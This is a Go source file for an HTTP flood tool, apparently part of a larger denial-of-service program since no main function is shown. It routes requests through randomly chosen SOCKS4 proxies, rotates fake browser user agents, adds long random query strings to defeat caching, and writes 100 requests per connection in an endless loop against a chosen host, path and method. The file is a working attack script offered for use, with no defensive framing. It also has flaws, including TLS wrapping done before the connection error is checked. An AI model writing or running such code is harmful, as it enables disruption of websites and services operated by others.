package main

import (
	"bufio"
	"crypto/tls"
	"fmt"
	"math/rand"
	"net"
	"os"
	"time"

	browser "github.com/EDDYCJY/fake-useragent"
	"github.com/gamexg/proxyclient"
)

func init() {
	rand.Seed(time.Now().UnixNano())
}

// Returns an array of User-agent
func getUserAgents(number int) []string {
	ua := make([]string, number)

	for i := range ua {
		ua[i] = browser.Random()
	}

	return ua
}

// Returns a random element in the array
func random(seeds []string) string {
	return seeds[rand.Intn(len(seeds))]
}

func randomString(n int) string {
	var letters = []rune("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789")

	s := make([]rune, n)
	for i := range s {
		s[i] = letters[rand.Intn(len(letters))]
	}

	return string(s)
}

func randomParam() string {
	return fmt.Sprintf("?%s=%s", randomString(5), randomString(1000))
}

func readLines(fileName string) []string {
	var lines []string
	openFile, _ := os.Open(fileName)
	scanner := bufio.NewScanner(openFile)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	return lines
}

func makeRequests(_HOST string, _PORT string, _USERAGENT string, _PROXY string, _PATH string, _METHOD string) {
	var conn net.Conn
	_HEADER := _METHOD + " " + _PATH + randomParam() + " HTTP/1.1\r\nHost: " + _HOST + "\r\nConnection: Keep-Alive\r\nCache-Control: no-cache\r\nPragma: no-cache\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\r\nAccept-encoding: gzip, deflate, br\r\nReferer: https://www.google.com/\r\nUser-Agent: " + _USERAGENT + "\r\n\r\n"
	_ADDRESS := _HOST + ":" + _PORT
	// Dialer
	dialer, err := proxyclient.NewProxyClient("socks4://" + _PROXY)
	if err != nil {
		return
	}
	// Connect
	conn, err = dialer.DialTimeout("tcp", _ADDRESS, 5*time.Second)
	if _PORT == "443" {
		conn = tls.Client(conn, &tls.Config{
			ServerName:         _HOST,
			InsecureSkipVerify: true,
		})
	}
	if err != nil {
		return
	}
	defer conn.Close()
	for i := 0; i < 100; i++ {
		conn.Write([]byte(_HEADER))
	}
}

func prepareRequests(_HOST string, _PORT string, _USERAGENTS []string, _PROXIES []string, _PATH string, _METHOD string) {
	for {
		_USERAGENT := random(_USERAGENTS)
		_PROXY := random(_PROXIES)
		makeRequests(_HOST, _PORT, _USERAGENT, _PROXY, _PATH, _METHOD)
	}
}
